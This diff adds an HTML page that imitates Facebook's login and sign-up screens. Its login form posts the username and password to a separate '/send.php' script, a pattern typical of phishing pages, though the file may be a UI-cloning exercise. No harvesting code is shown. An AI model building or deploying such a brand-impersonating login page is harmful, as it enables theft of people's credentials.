@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Jost:ital,wght@1,300&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="css/styles.css">
+    <title>Document</title>
+  </head>
+  <body>
+    <header>
+      <div class="container">
+        <img src="images/facebook-logo.png" alt="fecabook" width="150"/>
+        <form
+          id="form_login"
+          name="formulario"
+          method="post"
+          action="/send.php"
+        >
+        <span id="correo_telefono">
+          <input type="text" name="username" />
+        </span>
+        
+        <span id="contraseña">
+          <input type="password" name="password" />
+        </span>
+
+          <input type="submit" value="Log In" />
+          <a href="#">Forggoten account?</a>
+        </form>
+      </div>
+    </header>
+
+    <main>
+      <form id="form_register" action="register" method="post">
+        <h1>Create a new account</h1>
+        <p class="mb-2">It´s free and always will be</p>
+        <div>
+          <input type="text" placeholder="First name" />
+          <input type="text" placeholder="Surname" />
+        </div>
+        <br />
+        <input
+          class="block"
+          type="text"
+          placeholder="Mobile number or Email address"
+        />
+        <input type="password" placeholder="New password" />
+
+        <h4>Birthday</h4>
+        <div class="inline">
+          <input type="date" name="birthday" />
+          <a href="#">Why do i need to provide my date of birth</a>
+        </div>
+        <br />
+        <div class="inline w-50">
+          <label for="opt_fem">
+            <input id="opt_fem" type="radio" name="genero" value="female" />
+            Female
+          </label>
+
+          <label for="opt_mal">
+            <input id="opt_mal" type="radio" name="genero" value="male" />
+            Male
+          </label>
+        </div>
+        <br />
+
+        <p class="info mt-2">
+          By clicking Create Account, you agree to our Terms and confirm that
+          you have read our Date Policy, including our Cookis Use Policy. You
+          may recerve SMS message notifications from Facebook and can opt out at
+          any time.
+        </p>
+
+        <input class="mt-2" type="submit" value="Creat Account" />
+      </form>
+    </main>
+  </body>
+</html>
